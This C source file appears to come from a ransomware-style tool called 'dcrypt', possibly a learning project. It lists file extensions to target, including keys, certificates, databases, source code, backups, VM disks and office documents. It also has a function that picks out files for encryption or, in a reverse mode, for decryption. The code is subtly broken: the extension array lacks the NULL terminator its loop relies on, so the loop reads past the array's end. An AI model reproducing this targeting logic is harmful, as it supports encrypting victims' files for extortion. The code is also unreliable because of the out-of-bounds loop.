#include "dcrypt.h"

const char *handled_extensions[] = {
    "der", "pfx", "key", "crt", "csr", "p12", "pem", "odt", "ott", "sxw", "stw", "uot",
    "3ds", "max", "3dm", "ods", "ots", "sxc", "stc", "dif", "slk", "wb2", "odp", "otp",
    "sxd", "std", "uop", "odg", "otg", "sxm", "mml", "lay", "lay6", "asc", "sqlite3",
    "sqlitedb", "sql", "accdb", "mdb", "db", "dbf", "odb", "frm", "myd", "myi", "ibd",
    "mdf", "ldf", "sln", "suo", "cs", "c", "cpp", "pas", "h", "asm", "js", "cmd", "bat",
    "ps1", "vbs", "vb", "pl", "dip", "dch", "sch", "brd", "jsp", "php", "asp", "rb",
    "java", "jar", "class", "sh", "mp3", "wav", "swf", "fla", "wmv", "mpg", "vob",
    "mpeg", "asf", "avi", "mov", "mp4", "3gp", "mkv", "3g2", "flv", "wma", "mid",
    "m3u", "m4u", "djvu", "svg", "ai", "psd", "nef", "tiff", "tif", "cgm", "raw",
    "gif", "png", "bmp", "jpg", "jpeg", "vcd", "iso", "backup", "zip", "rar", "7z",
    "gz", "tgz", "tar", "bak", "tbk", "bz2", "PAQ", "ARC", "aes", "gpg", "vmx", 
    "vmdk", "vdi", "sldm", "sldx", "sti", "sxi", "602", "hwp", "snt", "onetoc2", 
    "dwg", "pdf", "wk1", "wks", "123", "rtf", "csv", "txt", "vsdx", "vsd", "edb", 
    "eml", "msg", "ost", "pst", "potm", "potx", "ppam", "ppsx", "ppsm", "pps", 
    "pot", "pptm", "pptx", "ppt", "xltm", "xltx", "xlc", "xlm", "xlt", "xlw", 
    "xlsb", "xlsm", "xlsx", "xls", "dotx", "dotm", "dot", "docm", "docb", "docx", 
    "doc"
};

const char* get_file_extension(const char *filepath) {
    // Find the last occurrence of the dot character
    const char *dot = strrchr(filepath, '.');
    
    // If there is no dot return NULL
    if (!dot) return NULL;

    // Return the extension (the substring starting from the dot)
    return dot + 1; // +1 to skip the dot itself
}

bool is_extension_handled(t_env *env, char *filepath)
{
    // Find the last occurrence of the dot character
    const char *extension = get_file_extension(filepath);
    if (!extension) {
        if (env->modes & DC_VERBOSE)
            fprintf(stderr, FMT_ERROR " No extension found.\n");
        return false;
    }

	// If reverse mode is on, file extension has to match our custom extension
	if (env->modes & DC_REVERSE)
	{
		if (strcmp(extension, DC_DCRYPT_EXT) == 0)
			return true;
	}
	else
	{ // Otherwise, extension has to be part of the handled extensions' list
		for (size_t i = 0; handled_extensions[i]; ++i)
			if (strcmp(extension, handled_extensions[i]) == 0)
				return true;
	}

    if (env->modes & DC_VERBOSE)
	    fprintf(stderr, FMT_ERROR " Unhandled extension.\n");

	return false;
}
